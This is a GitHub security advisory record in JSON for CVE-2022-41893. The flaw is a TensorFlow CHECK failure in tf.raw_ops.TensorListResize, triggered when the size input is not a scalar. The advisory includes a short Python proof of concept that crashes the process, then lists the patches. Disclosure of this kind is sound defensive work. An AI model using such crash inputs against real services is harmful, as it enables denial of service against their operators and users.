{
    "ghsaId": "GHSA-67pf-62xr-q35m",
    "severity": "MODERATE",
    "summary": "`CHECK_EQ` fail in `tf.raw_ops.TensorListResize`",
    "description": "### Impact\nIf [`tf.raw_ops.TensorListResize`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.cc) is given a nonscalar value for input `size`, it results `CHECK` fail which can be used to trigger a denial of service attack.\n```python\nimport numpy as np\nimport tensorflow as tf\n\na = data_structures.tf_tensor_list_new(elements = tf.constant(value=[3, 4, 5]))\nb = np.zeros([0, 2, 3, 3])\n\ntf.raw_ops.TensorListResize(input_handle=a, size=b)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [888e34b49009a4e734c27ab0c43b0b5102682c56](https://github.com/tensorflow/tensorflow/commit/888e34b49009a4e734c27ab0c43b0b5102682c56).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul\n",
    "permalink": "https://github.com/advisories/GHSA-67pf-62xr-q35m",
    "publishedAt": "2022-11-21T20:42:39Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-67pf-62xr-q35m"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-41893"
        }
    ]
}